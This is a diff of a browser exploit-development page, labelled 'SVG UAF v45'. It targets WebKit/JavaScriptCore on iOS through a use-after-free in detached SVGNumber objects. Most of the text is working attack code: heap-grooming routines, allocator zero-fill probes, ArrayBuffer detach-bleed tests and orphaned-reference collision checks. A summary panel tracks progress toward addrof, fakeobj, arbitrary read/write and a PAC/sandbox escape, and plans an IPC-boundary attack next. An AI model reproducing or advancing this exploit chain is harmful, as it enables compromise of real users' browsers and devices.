-  log('  SAB1: crossOriginIsolated = '+crossOriginIsolated,'dim');
-
-  if(sabAvail){
-    R.sab1.available=true;
-    try{
-      var sab=new SharedArrayBuffer(128);
-      var sa=new Int32Array(sab);
-      Atomics.store(sa,0,42);
-      var r=Atomics.load(sa,0);
-      log('  SAB1: SAB works! Atomics.store/load: wrote 42, read '+r,'win');
-      if(r===42)log('  SAB1: ✅ SharedArrayBuffer + Atomics fully operational','win');
-    }catch(e2){log('  SAB1: SAB exists but Atomics threw: '+e2,'bad');}
-  }else{
-    log('  SAB1: SharedArrayBuffer not available','dim');
-  }
-
-  if(workerAvail){
-    log('  SAB1: Workers available (race conditions possible even without SAB)','dim');
-  }
-
-  R.sab1.detail='sab='+sabAvail+' atomics='+atomicsAvail+' worker='+workerAvail;
-  log('  SAB1: sab='+sabAvail+' atomics='+atomicsAvail+' worker='+workerAvail,sabAvail?'win':'dim');
-  if(!q)dis(false);
-}
-
-/*
- * SET2: Adjacent ArrayBuffer detach exploitation attempt
- *
- * Strategy: allocate multiple ArrayBuffers in sequence, hoping they're adjacent
- * in WTF::fastMalloc. Transfer one of them mid-set() to see if the continued
- * write "bleeds" into the next adjacent allocation.
- *
- * This is hard to make deterministic but worth probing.
- * More importantly: measure the EXACT number of elements set() wrote AFTER detach
- * to understand JSC's internal loop (does it check detach every N elements?).
- */
-async function runSET2(q){
-  if(!q){dis(true);sep();log('SET2: Adjacent buffer detach write bleed test','inf');sep();}
+  var TAG_ORF=3333333.0;
+  var NMAT=50;var orphans=[];
 
   try{
-    var SZ=256; // Float64 elements = 2048 bytes each
-
-    // Alloc multiple buffers in quick succession (hoping for adjacency)
-    var bufs=[];var tas=[];
-    for(var i=0;i<32;i++){
-      var b=new ArrayBuffer(SZ*8);
-      bufs.push(b);
-      tas.push(new Float64Array(b));
+    // Phase 1: create many matrices and orphan ALL their SVGNumbers via removeItem()
+    for(var m=0;m<NMAT;m++){
+      var d=makeFCM(identity20());
+      var bl=d.fcm.values.baseVal;
+      var localOrphans=[];
+      // Get all 20 refs first, then removeItem() repeatedly
+      for(var i=0;i<20;i++){
+        try{var r=bl[0];r&&localOrphans.push(r);}catch(e){}
+        try{bl.removeItem(0);}catch(e){}
+      }
+      for(var i=0;i<localOrphans.length;i++){
+        try{localOrphans[i].value=TAG_ORF+m*20+i;}catch(e){}
+        orphans.push(localOrphans[i]);
+      }
+      cleanupD(d);
+      if(m%10===9){await raf();}
     }
+    log('  ORF1: total orphans created='+orphans.length+' (expected ~'+(NMAT*20)+')','dim');
 
-    // Fill each buffer with its index value
-    for(var i=0;i<32;i++)for(var j=0;j<SZ;j++)tas[i][j]=i*1000+j;
+    // Verify orphans are still alive with our TAG
+    var liveCount=0;
+    for(var i=0;i<orphans.length;i++){
+      try{var v=orphans[i].value;if(typeof v==='number')liveCount++;}catch(e){}
+    }
+    log('  ORF1: live orphans='+liveCount,'dim');
 
-    // Choose buffer 16 as victim
-    var VICTIM=16;
-    var src=[];for(var i=0;i<SZ;i++)src.push(i*3.14);
-    var newBuf16=null;var trigFired=false;
-    var TRIG2=128; // trigger halfway
-    Object.defineProperty(src,TRIG2,{get:function(){
-      if(!trigFired){trigFired=true;newBuf16=bufs[VICTIM].transfer();}
-      return TRIG2*3.14;
-    },configurable:true});
+    // Phase 2: create a fresh feColorMatrix to probe bump allocator
+    // If IsoHeap bump is still active, new SVGNumbers get fresh addresses
+    // If bump somehow wrapped or freelist is used, old addresses would be reused
+    var d2=makeFCM(identity20());
+    await raf();
+    var newRefs=[];for(var i=0;i<20;i++)try{newRefs.push(d2.fcm.values.baseVal[i]);}catch(e){}
 
-    // set on victim TA
-    try{tas[VICTIM].set(src);}catch(e2){log('  SET2: set threw: '+e2,'inf');}
+    // Write DIFFERENT tag to new refs
+    var TAG_NEW=5555555.0;
+    for(var i=0;i<newRefs.length;i++)try{newRefs[i].value=TAG_NEW;}catch(e){}
 
-    log('  SET2: trigFired='+trigFired+' newBuf16='+( newBuf16?newBuf16.byteLength:'null'),'dim');
-    log('  SET2: victim ta.byteLength='+tas[VICTIM].byteLength,'dim');
-
-    // Check: did any neighboring buffer get contaminated?
-    var contaminated=[];
-    for(var i=0;i<32;i++){
-      if(i===VICTIM)continue;
-      var clean=true;
-      for(var j=0;j<Math.min(SZ,tas[i].length);j++){
-        var expected=i*1000+j;
-        if(Math.abs(tas[i][j]-expected)>0.01){
-          clean=false;
-          contaminated.push({buf:i,idx:j,got:tas[i][j],expected:expected});
-          break;
+    // Check: do any orphan refs now read TAG_NEW? (would indicate address overlap)
+    var collisions=0;
+    for(var i=0;i<orphans.length;i++){
+      try{
+        var v=orphans[i].value;
+        if(Math.abs(v-TAG_NEW)<0.01){
+          collisions++;
+          log('  ORF1: ★ COLLISION! orphan['+i+'].value=TAG_NEW (address reused!)','win');
+          R.orf1.hit=true;
         }
-      }
+      }catch(e){}
     }
-    log('  SET2: contaminated neighbors: '+contaminated.length,contaminated.length>0?'win':'dim');
-    if(contaminated.length>0){
-      R.set2.hit=true;
-      for(var i=0;i<Math.min(5,contaminated.length);i++){
-        log('  ★ BLEED: buf['+contaminated[i].buf+']['+contaminated[i].idx+']='+contaminated[i].got+' expected='+contaminated[i].expected,'win');
-      }
-    }
+    log('  ORF1: address collisions='+collisions+' (>0 = IsoHeap reused orphan address!)','dim');
+    if(collisions===0)log('  ORF1: no collisions (IsoHeap bump-only confirmed again)','dim');
 
-    // Also: check if newBuf16 contains the post-trigger writes
-    if(newBuf16&&newBuf16.byteLength>0){
-      var newTA16=new Float64Array(newBuf16);
-      var postTrigCount=0;
-      for(var j=TRIG2+1;j<SZ;j++){
-        if(Math.abs(newTA16[j]-j*3.14)<0.01)postTrigCount++;
-      }
-      log('  SET2: post-trigger writes in newBuf16: '+postTrigCount+'/'+(SZ-TRIG2-1),'dim');
-      if(postTrigCount>0){R.set2.hit=true;log('  ★ SET2: writes confirmed in transferred buffer','win');}
-    }
+    cleanupD(d2);orphans=null;newRefs=null;
+  }catch(e){log('  ORF1 EXCEPTION: '+e,'bad');}
 
-  }catch(e){log('  SET2 EXCEPTION: '+e,'bad');}
-
-  R.set2.detail='';
-  log('  SET2: hit='+R.set2.hit,R.set2.hit?'win':'dim');
+  R.orf1.detail='hit='+R.orf1.hit;
+  log('  ORF1: hit='+R.orf1.hit,R.orf1.hit?'win':'dim');
   if(!q)dis(false);
 }
 
 /*
- * ANI2: SMIL-triggered freelist probe
+ * PTR1: UAF write breadth test + cross-allocator bleed detection
  *
- * Different from v43 ANI1! Key change: build freelist FIRST, then create animation.
- * The hypothesis: SMIL C++ allocation path (not JS-path) might use IsoHeap freelist.
+ * We have confirmed UAF write via dangling SVGNumber ref (Stage 0).
+ * What happens if we write TAG to 1000 dangling refs simultaneously?
+ * After parent removal, the SVGNumbers are "live" (ref count ≥ 1).
+ * Their m_value field is writable via the dangling ref.
  *
- * Sequence:
- * 1. Alloc many feColorMatrix → collect ALL 20 baseVal refs per matrix
- * 2. Write TAG to all baseVal[0] values: TAG=7654321
- * 3. Remove all matrices (frees all SVGNumbers to IsoHeap freelist)
- *    BUT: JS refs keep them alive → ref count stays 1 → NOT actually freed!
+ * BUT: writing OVERWRITES the m_value. The SVGNumber is a live C++ object.
+ * So this is NOT a "dangling ptr write to freed memory" — it's a write to a
+ * LIVE C++ object that has been detached from its SVGNumberList.
  *
- * Hmm. To ACTUALLY free to IsoHeap freelist we need ref count = 0.
- * The JS ref prevents that.
+ * The actual UAF scenario requires:
+ * 1. ACTUAL free: the JS ref RELEASES its hold on the SVGNumber
+ * 2. Another C++ object allocates at the freed address
+ * 3. The still-dangling ref writes to the new occupant
  *
- * ALTERNATIVE: use baseVal.clear() or baseVal.removeItem() to remove items
- * from the live list → the list releases its Ref<SVGNumber> → ref count drops
- * → if JS wrapper ALSO releases → ref count = 0 → actual IsoHeap free
+ * Since JS ref keeps SVGNumber alive, step 1 requires nulling the ref.
+ * But then we lose the dangling capability.
  *
- * Does removeItem(0) on a live SVGNumberList cause the SVGNumber to be freed?
- * Only if the JS wrapper doesn't hold a separate Ref<SVGNumber>.
+ * TEST: is there any path where the JS wrapper releases its internal C++ ref
+ * while the JS-side reference (our variable) still exists?
  *
- * For SVGNumberList items: the binding in WebKit typically creates a wrapper
- * that holds a strong reference. If removeItem() also removes the last Ref,
- * the SVGNumber is freed.
+ * Candidate: prototype chain manipulation
+ * If we shadow the `value` property on the JS wrapper prototype, does WebKit
+ * change the underlying C++ reference?
  *
- * Test this: call removeItem(0) while holding ref = baseVal[0]
- * Then read ref.value → if it throws → ref count hit 0 and object freed
- * If it reads the old value → ref is still valid (JS wrapper kept a ref)
+ * Also test: error handling in SVGNumber access methods
  */
-async function runANI2(q){
-  if(!q){dis(true);sep();log('ANI2: SMIL freelist probe + removeItem() ref counting','inf');sep();}
+async function runPTR1(q){
+  if(!q){dis(true);sep();log('PTR1: UAF write mechanisms + prototype chain test','inf');sep();}
 
-  var svgNS='http://www.w3.org/2000/svg';
-  var TAG_ANI2=7654321.0;
-
-  // Phase 1: test removeItem() ref counting behavior
-  var d=makeFCM(identity20());
-  await raf();
+  var TAG_P1=1111111.0;
+  var TAG_P2=2222222.0;
 
   try{
-    // Get ref to baseVal[0]
-    var ref0=d.fcm.values.baseVal[0];
-    log('  ANI2: got ref to baseVal[0]: value='+ref0.value,'dim');
-
-    // Write TAG
-    ref0.value=TAG_ANI2;
-    log('  ANI2: wrote TAG='+TAG_ANI2+', readback='+ref0.value,'dim');
-
-    // Now remove item 0 from the live list
-    var removed=null;
-    try{
-      removed=d.fcm.values.baseVal.removeItem(0);
-      log('  ANI2: removeItem(0) succeeded. list length after='+(d.fcm.values.baseVal.numberOfItems||d.fcm.values.baseVal.length),'dim');
-    }catch(e2){log('  ANI2: removeItem threw: '+e2,'inf');}
-
-    // Can we still read ref0? If yes → JS wrapper holds independent ref
-    var readAfterRemove=null;
-    try{readAfterRemove=ref0.value;log('  ANI2: ref0.value after removeItem='+readAfterRemove+' (still live!)',readAfterRemove===TAG_ANI2?'win':'dim');}
-    catch(e2){log('  ANI2: ref0.value after removeItem threw: '+e2+' (freed! true UAF)','crit');}
-
-    // If readAfterRemove === TAG_ANI2: the JS wrapper holds independent Ref<SVGNumber>
-    // The SVGNumber is STILL ALIVE even after removeItem().
-    // This means we need ref0 to go out of scope for the free to happen.
-    // We CAN'T get true IsoHeap free while holding the JS ref. CONFIRMED.
-    if(readAfterRemove===TAG_ANI2){
-      log('  ANI2: CONFIRMED: JS wrapper holds independent Ref<SVGNumber>','dim');
-      log('  ANI2: SVGNumber[0] is LIVE after removeItem() while ref0 alive','dim');
-    }
-  }catch(e){log('  ANI2-phase1 EXCEPTION: '+e,'bad');}
-  cleanupD(d);
-  await raf();
-
-  // Phase 2: SMIL allocates FRESH SVGNumbers for animVal at animation creation time
-  // Can we time the freelist to have slots when the animation is created?
-  //
-  // Problem: we can't release JS refs and still detect groom.
-  // Solution: DON'T hold refs. Just see if animVal values == TAG (which we wrote to freed slot)
-  //
-  // Step 1: alloc 100 matrices, build lots of SVGNumbers in IsoHeap
-  // Step 2: release ALL refs (no JS refs held) → all SVGNumbers freed to IsoHeap
-  // Step 3: create NEW animation → animVal SVGNumbers allocated → might hit freelist
-  // Step 4: read animVal values → if any == old values (not 0 or 1), freelist was used
-  // Note: animVal values start as the "from" value or baseVal. We initialize matrices
-  // with special non-identity values so we can detect if SMIL reused freed slots.
-
-  try{
-    var NMAT=200;var SPECIAL_VAL=3.14159;
-    var mats=[];
-    for(var i=0;i<NMAT;i++){
-      var vals=[];for(var j=0;j<20;j++)vals.push(SPECIAL_VAL+i*0.001+j*0.0001);
-      mats.push(makeFCM(vals));
-    }
+    // Test 1: Prototype chain manip on SVGNumber wrapper
+    var d=makeFCM(identity20());
     await raf();
+    var ref0=d.fcm.values.baseVal[0];
+    log('  PTR1: ref0.value='+ref0.value,'dim');
+    ref0.value=TAG_P1;
+    log('  PTR1: after write TAG_P1='+TAG_P1+': ref0.value='+ref0.value,'dim');
 
-    // Release ALL matrices (drop refs)
-    for(var i=0;i<NMAT;i++)cleanupD(mats[i]);
-    mats=null;
-    await raf();await raf();
-
-    // NOW create a fresh feColorMatrix WITH ANIMATION
-    var svgEl=document.createElementNS(svgNS,'svg');
-    svgEl.setAttribute('width','1');svgEl.setAttribute('height','1');
-    svgEl.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
-    var defs2=document.createElementNS(svgNS,'defs');
-    var filt2=document.createElementNS(svgNS,'filter');filt2.setAttribute('id','anifilt2');
-    var fcm2=document.createElementNS(svgNS,'feColorMatrix');
-    fcm2.setAttribute('type','matrix');
-    fcm2.setAttribute('values',identity20().join(' '));
-
-    // Animate to different values
-    var anim2=document.createElementNS(svgNS,'animate');
-    anim2.setAttribute('attributeName','values');
-    anim2.setAttribute('from',identity20().join(' '));
-    anim2.setAttribute('to','0.1 0.9 0 0 0 0 0.1 0.9 0 0 0 0 0.1 0.9 0 0 0 0 0.1 0.9');
-    anim2.setAttribute('dur','10s');
-    anim2.setAttribute('repeatCount','indefinite');
-    anim2.setAttribute('begin','0s');
-    fcm2.appendChild(anim2);
-
-    filt2.appendChild(fcm2);defs2.appendChild(filt2);svgEl.appendChild(defs2);
-    document.body.appendChild(svgEl);
-    await raf();await raf();
-
-    // Read animVal right after animation starts
-    var animVals=[];
+    // Try to override the getter on the prototype
+    var proto=Object.getPrototypeOf(ref0);
+    log('  PTR1: ref0 prototype='+proto,'dim');
     try{
-      var av=fcm2.values&&fcm2.values.animVal;
-      if(av){for(var i=0;i<20;i++)animVals.push(av[i]?av[i].value:null);}
-    }catch(e2){}
-    log('  ANI2: fresh animVal[0..4]='+animVals.slice(0,5).join(','),'dim');
+      // Shadow 'value' property
+      Object.defineProperty(ref0,'value',{
+        get:function(){return 99999.0;},
+        set:function(v){log('  PTR1: shadowed setter called with v='+v,'inf');},
+        configurable:true
+      });
+      log('  PTR1: own property defined on ref0','dim');
+      log('  PTR1: ref0.value after shadow='+ref0.value+' (expect 99999)','dim');
+      // Delete our shadow — does underlying C++ ref still work?
+      delete ref0.value;
+      log('  PTR1: after delete shadow: ref0.value='+ref0.value+' (expect TAG_P1='+TAG_P1+')','dim');
+    }catch(e2){log('  PTR1: prototype manip threw: '+e2,'inf');}
 
-    // Check if any animVal value matches SPECIAL_VAL range (would indicate freelist reuse)
-    var specialHits=animVals.filter(function(v){return typeof v==='number'&&v>3.0&&v<3.2;});
-    log('  ANI2: SMIL animVal values in SPECIAL_VAL range (3.14...): '+specialHits.length,'dim');
-    if(specialHits.length>0){
-      R.ani2.hit=true;
-      log('  ANI2: ★ SMIL ALLOCATOR USED FREELIST! animVal shows old values!','win');
-    }else{
-      log('  ANI2: SMIL allocator did NOT use freelist (animVal shows fresh values)','dim');
+    // Test 2: Set value via CSS property (if feColorMatrix values reflected)
+    // feColorMatrix.values → SVGAnimatedNumberList
+    // feColorMatrix.style?.colorMatrix? Nope.
+    // But: d.fcm.values.baseVal[0].value = ... reflects to 'values' attribute
+    log('  PTR1: ref0.value after all manip='+ref0.value,'dim');
+
+    // Test 3: What happens if we call value setter with Infinity, NaN, MAX_VALUE?
+    var extremes=[Infinity,-Infinity,NaN,Number.MAX_VALUE,-Number.MAX_VALUE,0,-0,2147483647,-2147483648];
+    for(var i=0;i<extremes.length;i++){
+      try{ref0.value=extremes[i];var rb=ref0.value;
+        log('  PTR1: write '+extremes[i]+' → readback='+rb,'dim');
+      }catch(e2){log('  PTR1: write '+extremes[i]+' threw: '+e2,'inf');}
     }
 
-    svgEl.parentNode&&svgEl.parentNode.removeChild(svgEl);
-  }catch(e){log('  ANI2-phase2 EXCEPTION: '+e,'bad');}
+    // Test 4: Rapid sequential remove+readback cycle
+    // removeItem → ref still alive → does value survive?
+    var bl=d.fcm.values.baseVal;
+    ref0.value=TAG_P1;
+    try{bl.removeItem(0);}catch(e2){}
+    log('  PTR1: after removeItem(0): ref0.value='+ref0.value+' (expect TAG_P1 if alive)','dim');
 
-  R.ani2.detail='';
-  log('  ANI2: hit='+R.ani2.hit,R.ani2.hit?'win':'dim');
+    // Now delete the whole SVG and read
+    cleanupD(d);
+    var readAfterDel=null;
+    try{readAfterDel=ref0.value;}catch(e2){readAfterDel='threw:'+e2;}
+    log('  PTR1: after svg removal: ref0.value='+readAfterDel,'dim');
+    R.ptr1.hit=true;
+
+    // Test 5: SVGNumber value assignment returns — does it return the set value?
+    var d2=makeFCM([99,0,0,0,0,0,99,0,0,0,0,0,99,0,0,0,0,0,99,0]);
+    await raf();
+    var r1=d2.fcm.values.baseVal[0];
+    var setResult=(r1.value=42.5,r1.value);
+    log('  PTR1: value setter roundtrip: set 42.5 → read='+setResult,'dim');
+
+    // float32 precision test: does iOS 26 use float32 or float64?
+    var FLOAT32_TEST=1.23456789012345678;
+    r1.value=FLOAT32_TEST;
+    var rb=r1.value;
+    var diff=Math.abs(rb-FLOAT32_TEST);
+    log('  PTR1: float precision test: set='+FLOAT32_TEST+' got='+rb+' diff='+diff.toExponential(3),'dim');
+    log('  PTR1: float32 confirmed: '+(diff>1e-7?'YES (rounding to f32)':'NO (f64 precision)'),'dim');
+
+    cleanupD(d2);
+
+  }catch(e){log('  PTR1 EXCEPTION: '+e,'bad');}
+
+  R.ptr1.detail='';
+  log('  PTR1: complete',R.ptr1.hit?'ok':'dim');
   if(!q)dis(false);
 }
 
-// Summary
+// Build summary
 function buildSummary(){
   SP.classList.add('on');
   function badge(l,k){return'<span class="b b'+k+'">'+l+'</span>';}
@@ -988,80 +1036,76 @@ function buildSummary(){
       '</div></div>';
   }
 
-  var ptrLeak=R.vec1.hit||R.vec2.hit||R.vec3.hit;
-  var trnConfirmed=R.trn1.writeConfirmed;
-  var sabReady=R.sab1.available;
-  var anyHit=ptrLeak||trnConfirmed||R.was1.hit||R.set2.hit||R.ani2.hit;
+  var btfHit=R.but1.hit||R.but2.hit;
+  var ptrLeak=btfHit||R.frc1.hit;
+  var allocZeroes=R.zro1.zeros;
+  var hasCreateSVGNum=R.rpi1.hit;
+  var anyHit=btfHit||R.frc1.hit||R.orf1.hit;
 
   var html='';
   html+=row('dg','Stage 0 — UAF Primitive','✅ DONE','vg',
-    [badge('float32 write','ok'),badge('no-clamp','ok')],
-    'Confirmed v39. Detached SVGNumber write stable.');
+    [badge('float32 write','ok'),badge('no-clamp','ok'),badge('removeItem() confirmed','ok')]);
 
-  html+=row('dr','Stage 1 (IsoHeap)','🔴 DEAD — bump-only by design (Spectre mitigation)','vr',
-    [badge('PAW5 definitive','f'),badge('v42 confirmed','f')]);
+  html+=row('dr','Stage 1 (IsoHeap)','🔴 DEAD — bump-only by design','vr',
+    [badge('ORF1: '+( R.orf1.hit?'collision!':'no collision'),R.orf1.hit?'ok':'f')]);
 
-  html+=row(ptrLeak?'dg':(anyHit?'dy':'dr'),
-    'Stage 1 — WTF::fastMalloc Vector Groom',
-    ptrLeak?'✅ POINTER LEAK — Ref<SVGNumber> addresses recovered!':(anyHit?'🟡 SIGNALS':'🔴 CLEAN'),
-    ptrLeak?'vg':(anyHit?'vy':'vr'),
-    [
-      badge('vec1:'+(R.vec1.hit?'✅ '+R.vec1.ptrs.length+' ptrs':'✗'),R.vec1.hit?'ok':'i'),
-      badge('vec2:'+(R.vec2.hit?'✅ '+R.vec2.ptrs.length+' ptrs':'✗'),R.vec2.hit?'ok':'i'),
-      badge('vec3:'+(R.vec3.hit?'✅':'✗'),R.vec3.hit?'ok':'i'),
-      badge('trn1:'+(R.trn1.writeConfirmed?'✅ write-alias':'✗'),R.trn1.writeConfirmed?'ok':'i'),
-      badge('set2:'+(R.set2.hit?'✅':'✗'),R.set2.hit?'ok':'i'),
-      badge('ani2:'+(R.ani2.hit?'✅':'✗'),R.ani2.hit?'ok':'i'),
-    ],
-    ptrLeak?'EXPLOIT PATH OPEN: Read ptr = Ref<SVGNumber> address. Use UAF write to corrupt it.':
-    trnConfirmed?'Transfer write-alias confirmed. ta.set() after transfer writes to newBuf. Potential for controlled write.':
-    'WTF::fastMalloc groom not landing on freed vector slots. Try v45 with more aggressive spray.');
+  html+=row(allocZeroes?'dr':(btfHit?'dg':'dy'),
+    'fastMalloc zeroing test',
+    allocZeroes?'🔴 ZEROES ON ALLOC — pointer leak blocked':(btfHit?'✅ NO ZEROING':'🟡 TESTED'),
+    allocZeroes?'vr':(btfHit?'vg':'vy'),
+    [badge('ZRO1:'+(R.zro1.zeros?'zeroes':'NO ZERO'),R.zro1.zeros?'f':'ok')],
+    allocZeroes?'WTF::fastMalloc zeroes freed blocks before reuse. All ArrayBuffer groom approaches blocked.':
+    'Non-zeroing allocator detected. Groom approaches viable.');
 
-  html+=row(ptrLeak?'dy':'dgr','Stage 2 — Type Confusion via ptr corruption',
-    ptrLeak?'🟡 REACHABLE — overwrite Ref<SVGNumber> via groomed ArrayBuffer':'⬜ BLOCKED','vy',
-    [badge('needs vec1/2 hit','i')],
-    ptrLeak?'Write fake ptr into groomed ArrayBuffer → access via SVGNumberList → wrong SVGNumber':
-    'Cannot reach until vec groom confirmed');
+  html+=row(btfHit?'dg':(allocZeroes?'dr':'dy'),
+    'Stage 1 — JSC Butterfly Groom',
+    btfHit?'✅ CELL POINTERS LEAKED — addrof achieved!':(allocZeroes?'🔴 BLOCKED by zeroing':'🟡 TESTED'),
+    btfHit?'vg':(allocZeroes?'vr':'vy'),
+    [badge('BUT1:'+(R.but1.hit?'✅ '+R.but1.ptrs.length+' ptrs':'✗'),R.but1.hit?'ok':'i'),
+     badge('BUT2:'+(R.but2.hit?'✅':'✗'),R.but2.hit?'ok':'i')],
+    btfHit?'EXPLOIT PATH OPEN: JSC cell pointers leaked via butterfly groom. AddrOf available!':
+    'Butterfly groom not producing pointer leaks. Either zeroing or wrong size class.');
 
-  html+=row('dy','Stage 3 — AddrOf (PARTIAL)','🟡 block-level ULP@4GB + ptr leak if vec groom','vy',
-    [badge('ULP@4GB=512','ok'),badge('ptr leak: '+(ptrLeak?'✅ YES':'none'),ptrLeak?'ok':'i')]);
+  html+=row(hasCreateSVGNum?'dg':'dgr','createSVGNumber() + replaceItem()',
+    hasCreateSVGNum?'✅ Available — standalone SVGNumber creation confirmed':'not available',
+    hasCreateSVGNum?'vg':'vgr',[]);
 
+  html+=row(R.frc1.hit?'dg':'dgr','feConvolveMatrix kernelMatrix (FIXED)',
+    R.frc1.hit?'✅ Accessible — kernelMatrix groom possible':'not accessible or zeroing blocked',
+    R.frc1.hit?'vg':'vgr',[]);
+
+  html+=row(btfHit?'dy':'dr','Stage 2 — Type Confusion',
+    btfHit?'🟡 REACHABLE if cell ptrs point to wrong type':'🔴 BLOCKED','vy',
+    [badge('needs butterfly hit','i')]);
+
+  html+=row('dy','Stage 3 — AddrOf','🟡 ULP@4GB + butterfly ptrs if leak','vy',[]);
   html+=row('dr','Stage 4 — FakeObj','🔴 BLOCKED','vr',[badge('needs 2+3','i')]);
-  html+=row('dr','Stage 5 — Arb R/W','🔴 BLOCKED','vr',[badge('ArrayBuffer','i')]);
-  html+=row('dgr','Stage 6 — PAC+Escape','⬜ FAR','vgr',[badge('arm64e','f')]);
-
-  html+='<div class="sdiv"></div>';
-
-  // Wasm + SAB status
-  html+=row(R.was1.hit?'dg':'dgr','Bonus: Wasm memory.grow()',
-    R.was1.hit?'✅ DETACH ANOMALY':'clean',R.was1.hit?'vg':'vgr',[]);
-  html+=row(sabReady?'dg':'dgr','Bonus: SharedArrayBuffer',
-    sabReady?'✅ AVAILABLE — race conditions possible':'not available',sabReady?'vg':'vgr',[]);
+  html+=row('dr','Stage 5 — Arb R/W','🔴 BLOCKED','vr',[]);
+  html+=row('dgr','Stage 6 — PAC+Escape','⬜ FAR','vgr',[]);
 
   html+='<div class="sdiv"></div>';
   html+='<div class="sf">'+
-    '<span class="hl">VEC1/2/3 GOAL: </span>pointer-like f64 values in sprayed ArrayBuffer after SVG list resize<br>'+
-    '<span class="hl">KEY SIGNAL: </span>any 0x00000001xxxxxxxx value in ArrayBuffer = Ref&lt;SVGNumber&gt; leak<br>'+
-    '<span class="hl">IF HIT: </span>v45 writes fake ptr into groomed ArrayBuffer → SVGNumberList reads it → type confusion<br>'+
-    '<span class="hl">TRN1: </span>confirms ta.set() write-alias to transferred buffer (SET1-A was real)<br>'+
-    '<span class="hl">ANI2: </span>removes and tests animVal IsoHeap path vs baseVal JS path<br>'+
-    '<span class="hl">IF ALL MISS: </span>WTF::fastMalloc might zero-fill on alloc. Try v45 with explicit timing/spray. Or target different vector size class.<br>'+
+    '<span class="hl">ZRO1 CRITICAL: </span>if zeroes=true, ALL fastMalloc groom dead. Move to IPC or CVE approach.<br>'+
+    '<span class="hl">BUT1/2 KEY SIGNAL: </span>any 0x0000_0001xxxxxxxx in ArrayBuffer = JSC cell ptr = addrof primitive<br>'+
+    '<span class="hl">FRC1: </span>feConvolveMatrix kernelMatrix fix — if accessible, surgical single-alloc after resize<br>'+
+    '<span class="hl">ORF1: </span>collision=true would prove IsoHeap freelist used — still most direct path if possible<br>'+
+    '<span class="hl">IF ALL MISS: </span>v46 target: WebKit XPC/IPC boundary attack OR CVE-specific PoC reproduction<br>'+
   '</div>';
   SB.innerHTML=html;
 }
 
 async function runAll(){
   dis(true);clearAll();sep();
-  log('SVG UAF v44 — WTF::fastMalloc vector groom','inf');sep();
+  log('SVG UAF v45 — Butterfly groom + allocator zeroing probe','inf');sep();
   var tests=[
-    ['VEC1_length_list_groom',runVEC1],
-    ['VEC2_type_change_groom',runVEC2],
-    ['VEC3_convolve_matrix_groom',runVEC3],
-    ['TRN1_transfer_write_dest',runTRN1],
-    ['WAS1_wasm_memory_grow',runWAS1],
-    ['SAB1_sharedarraybuffer',runSAB1],
-    ['SET2_adjacent_buf_bleed',runSET2],
-    ['ANI2_smil_freelist_probe',runANI2],
+    ['ZRO1_zerofill_detect',runZRO1],
+    ['BUT1_butterfly_groom',runBUT1],
+    ['BUT2_butterfly_variant',runBUT2],
+    ['RPI1_replaceitem',runRPI1],
+    ['FRC1_feconvolve_fixed',runFRC1],
+    ['WRK1_worker_race',runWRK1],
+    ['ORF1_orphan_chain',runORF1],
+    ['PTR1_uaf_breadth',runPTR1],
   ];
   for(var i=0;i<tests.length;i++){
     sep();log(tests[i][0],'inf');sep();
